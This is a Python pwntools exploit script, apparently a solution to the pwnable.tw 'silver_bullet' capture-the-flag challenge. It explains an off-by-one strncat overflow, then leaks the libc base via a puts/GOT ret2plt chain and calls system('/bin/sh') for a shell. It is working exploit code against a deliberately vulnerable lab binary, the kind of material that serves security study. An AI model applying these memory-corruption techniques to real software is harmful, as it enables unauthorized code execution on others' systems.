#!/usr/bin/env python3
from pwn import *
from sys import argv
"""
It seems as though the werewolf's score is 2147483647/0x7fffffff
that is the largest value a 32 bit signed integer may hold before overflowing

maximum read size for each diescription is 0x30/48 bytes

no canary, which means it will be a stack pwn...
plus no imported plt symbol for malloc...

strncat off by one, gives us buffer overflow
simple ret2plt to leak libc, and shell

off by one:

the stack layout for the game looks like this:


      EBP
+---------------+
|   ret addr    |
+---------------+
|    old base   |
+---------------+
|   wolf.power  |  <- very noticable on stack
+---------------+
|   wolf.name   |  <- pointer to string in .text
+---------------+
|  bullet.name  |  <- we have our null byte overflow here!
|               |
+---------------+
|  bullet.power |  <- we can overflow into power giving us bof
+---------------+
|   junk junk   |  <- i did not include junk
+---------------+
       ESP

gef➤  x/60wx $ebp
0xffffcee4:     0xffffcf28      0x0804898e      0x7ffffff7      0x08048d06
0xffffcef4:     0x41414141      0x41414141      0x00000000      0x00000000
0xffffcf04:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcf14:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcf24:     0x00000008      0x00000000      0xf7dc0a0d      0x00000001
0xffffcf34:     0xffffcfd4      0xffffcfdc      0xffffcf64      0x00000000
0xffffcf44:     0x00000000      0xf7fe930d      0xf7f91e1c      0xf7fcdaa8
0xffffcf54:     0xf7ffcfe0      0xffffcfb8      0xffffffff      0xf7ffd9b0
0xffffcf64:     0x00000000      0x00000001      0x080484f0      0x00000000
0xffffcf74:     0x32c81baa      0x7545ffba      0x00000000      0x00000000
0xffffcf84:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcf94:     0x00000000      0xf7fdd96d      0xf7ffcfe0      0x00000001
0xffffcfa4:     0x080484f0      0x00000000      0x08048511      0x08048954
0xffffcfb4:     0x00000001      0xffffcfd4      0x08048a20      0x08048a80
0xffffcfc4:     0xf7fddab0      0xffffcfcc      0xf7ffd9b0      0x00000001


We have a null byte overflow in bullet.name, so we will be able to overflow a single null byte with
bullet.power with the use of the vulnerabile strncpy implementation.

"""
context(arch='i386',os='linux')
binary=ELF("./silver_bullet",checksec=False)
if len(argv)>1 and argv[1]=="-r":
    p=remote("chall.pwnable.tw",10103)
    libc=ELF("./libc_32.so.6",checksec=False)
else:
    libc=ELF("/usr/lib32/libc.so.6",checksec=False)
    p=binary.process()
s=lambda x,r="":p.sendlineafter(r,x)if r else p.sendline(x)
create=lambda desc:(s("1","choice :"),s(desc,":"))
powerup=lambda desc:(s("2","choice :"),s(desc,":"))
beat=lambda :s("3","choice :")
ret=lambda:s("4","choice :")
def xpl():
    create("A"*47)
    powerup("A")
    #temp=[chr(i)*4 for i in range(0x41,0x4b)]
    # 8 bytes offset = 0xadbeef41 as IP reg
    # 9 bytes offset = 0xbeef4141 as IP reg

pop_ebx=p32(0x08048475)

# junk + puts + return_address + parameters
xpl()

leak_payload=b"A"*7+p32(binary.plt['puts'])+pop_ebx+p32(binary.got['puts'])+p32(binary.symbols['main'])
powerup(leak_payload)
beat();beat()
p.recvuntil(b"!!\n")
base=int.from_bytes(p.recvline().strip(b"\n"),"little")-libc.symbols['puts']
log.info("Leaked libc base: %s"%hex(base))

log.info("Exploiting and recvieving shell")

one=0xd712a041
xpl()
payload=b"A"*7+p32(libc.symbols['system']+base)+pop_ebx+p32(next(libc.search(b"/bin/sh\x00"))+base)
powerup(payload)
beat();beat()

p.interactive()
